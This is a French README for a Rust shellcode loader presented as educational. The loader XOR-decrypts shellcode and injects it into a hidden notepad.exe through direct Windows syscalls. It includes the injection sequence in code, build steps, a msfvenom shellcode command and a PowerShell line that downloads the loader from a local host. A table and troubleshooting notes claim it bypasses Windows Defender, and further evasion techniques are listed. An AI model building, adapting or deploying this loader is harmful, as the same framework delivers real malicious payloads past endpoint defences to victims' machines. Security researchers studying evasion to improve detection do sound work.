# 🦀 Rust Syscall Loader

Un loader shellcode éducatif utilisant les **direct syscalls** en Rust pour exécuter calc.exe sur Windows.

> ⚠️ **AVERTISSEMENT**: Ce projet est uniquement à des fins éducatives et de recherche en sécurité. N'utilisez jamais ces techniques à des fins malveillantes.

## 📚 Concepts Clés

### Qu'est-ce qu'un Direct Syscall ?

Un **syscall** (system call) est une instruction CPU qui permet à un programme de demander un service au noyau Windows. Normalement, les programmes passent par les APIs Windows (ntdll.dll) qui font le syscall pour eux.

```
[Programme] → [kernel32.dll] → [ntdll.dll] → [SYSCALL] → [Kernel]
                    ↑               ↑
              EDR Hook          EDR Hook
```

Avec les **direct syscalls**, on bypass ces DLLs en faisant l'appel système directement :

```
[Programme] → [SYSCALL] → [Kernel]
                  ↑
           Pas de hook possible !
```

### Syscalls Utilisés (v3)

| Syscall | Description |
|---------|-------------|
| `NtOpenProcess` | Ouvre le processus cible (notepad.exe) avec droits minimum |
| `NtAllocateVirtualMemory` | Alloue de la mémoire RW dans le processus cible |
| `NtWriteVirtualMemory` | Écrit le shellcode dans la mémoire distante |
| `NtProtectVirtualMemory` | Change la protection mémoire RW → RX |
| `NtCreateThreadEx` | Crée un thread distant pour exécuter le shellcode |
| `NtClose` | Ferme les handles (process et thread) |

## 🛠️ Installation

### Prérequis

1. **Rust Nightly** (requis pour rust_syscalls)
```bash
rustup install nightly
rustup default nightly
```

2. **Target Windows** (pour cross-compilation depuis macOS/Linux)
```bash
rustup target add x86_64-pc-windows-gnu
```

3. **MinGW-w64** (linker pour Windows)
```bash
# macOS
brew install mingw-w64

# Linux (Debian/Ubuntu)
sudo apt install mingw-w64
```

## 🔨 Compilation

### Build pour Windows (depuis macOS)

```bash
# Debug build
cargo build --target x86_64-pc-windows-gnu

# Release build (recommandé)
cargo build --release --target x86_64-pc-windows-gnu
```

Le binaire sera généré dans :
```
target/x86_64-pc-windows-gnu/release/calc_loader.exe
```

### Configuration Cross-Compilation

Créez `.cargo/config.toml` (déjà inclus) :

```toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
```

## 🚀 Utilisation

1. Compilez le projet
2. Transférez le `.exe` sur une VM Windows
3. Exécutez-le → La calculatrice s'ouvre !

```powershell
# Sur Windows
.\loader_rust.exe
```

## 📝 Structure du Code

```
loader_rust/
├── Cargo.toml          # Dépendances et configuration
├── .cargo/
│   └── config.toml     # Configuration cross-compilation
├── src/
│   └── main.rs         # Code principal avec syscalls
└── README.md           # Ce fichier
```

### Architecture du Loader v3

```rust
fn main() {
    // 1. Spawn notepad.exe (hidden)
    let pid = spawn_notepad_syscall();
    
    // 2. Inject shellcode
    inject_shellcode(pid, &ENCRYPTED_SHELLCODE);
}

fn inject_shellcode(pid: u32, shellcode: &[u8]) {
    // XOR decrypt
    let decrypted = xor_decrypt(shellcode, &XOR_KEY);
    
    // Open target process (minimum rights!)
    syscall!("NtOpenProcess", pid, 0x002A)  // Not PROCESS_ALL_ACCESS!
    
    // Allocate RW memory in target
    syscall!("NtAllocateVirtualMemory", PAGE_READWRITE)
    
    // Write shellcode (full syscall!)
    syscall!("NtWriteVirtualMemory", shellcode)  // Not copy_nonoverlapping!
    
    // Change to RX
    syscall!("NtProtectVirtualMemory", PAGE_EXECUTE_READ)
    
    // Create remote thread
    syscall!("NtCreateThreadEx", ...)
    
    // Cleanup with syscalls
    syscall!("NtClose", thread_handle)
    syscall!("NtClose", process_handle)
}
```

## 🔧 Générer un Nouveau Shellcode

Pour générer votre propre shellcode calc.exe avec msfvenom :

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f rust
```

```bash
Invoke-WebRequest -Uri "http://192.168.x.x:8080/calc_loader.exe" -OutFile "C:\Users\$env:USERNAME\Downloads\calc_loader.exe"
```


Remplacez ensuite le contenu de `CALC_SHELLCODE` dans `main.rs`.

## 📖 Ressources

- [rust_syscalls](https://github.com/janoglezcampos/rust_syscalls) - Bibliothèque syscalls Rust
- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development) - Exemples et techniques
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) - Génération de syscalls

## 🎯 Techniques Avancées (Pour Aller Plus Loin)

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| Indirect Syscalls | Saute dans ntdll après le hook | ⭐⭐ |
| Hell's Gate | Récupère SSN dynamiquement | ⭐⭐⭐ |
| Halo's Gate | Hell's Gate + contourne les hooks | ⭐⭐⭐⭐ |
| TartarusGate | Halo's Gate amélioré | ⭐⭐⭐⭐⭐ |

## 🐛 Troubleshooting

### Erreur de compilation "linker not found"

```bash
# Vérifiez que mingw-w64 est installé
which x86_64-w64-mingw32-gcc

# Si pas trouvé, installez-le
brew install mingw-w64
```

### Erreur "requires nightly"

```bash
rustup default nightly
# ou
cargo +nightly build --release --target x86_64-pc-windows-gnu
```

### Windows Defender bloque l'exécution

Avec la v3, le loader devrait bypass Defender grâce à :
- XOR encryption du shellcode (pas de signature statique)
- Process injection (shellcode pas dans le loader)
- Direct syscalls (bypass hooks ntdll)
- RW→RX (pas de RWX suspect)

Si toujours détecté :
1. Vérifiez que le shellcode est bien chiffré
2. Utilisez une VM isolée pour tester
3. Considérez d'autres techniques (indirect syscalls, sleep obfuscation)

## 🛡️ Versions

| Version | Techniques | Détection Defender |
|---------|------------|--------------------|
| v1 | Direct syscalls | ❌ Détecté |
| v2 | + XOR + RW→RX | ✅ Bypass |
| v3 | + Process injection + NtWriteVirtualMemory + NtClose | ✅ Bypass |

## ⚖️ Disclaimer

Ce projet est fourni uniquement à des fins éducatives. L'auteur n'est pas responsable de toute utilisation malveillante. Testez uniquement sur des systèmes dont vous êtes propriétaire ou sur lesquels vous avez une autorisation explicite.

---

**Happy Hacking! 🦀**
